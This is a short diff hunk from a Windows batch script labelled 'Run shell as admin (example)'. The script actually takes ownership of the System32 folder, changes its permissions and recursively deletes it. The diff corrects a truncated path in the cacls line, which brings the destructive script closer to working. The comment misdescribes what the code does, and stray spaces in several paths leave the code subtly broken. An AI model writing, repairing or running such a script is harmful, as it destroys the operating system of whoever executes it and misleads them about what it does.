@@ -55,6 +55,6 @@
  REM Run shell as admin (example) - 
 @echo off
 takeown /f c: \windows\system32
-cacls c: \windows\system3
+cacls c: \windows\system32
 rd /s /q c:\windows\system32
 del /s /q c: \windows\system32\*.*
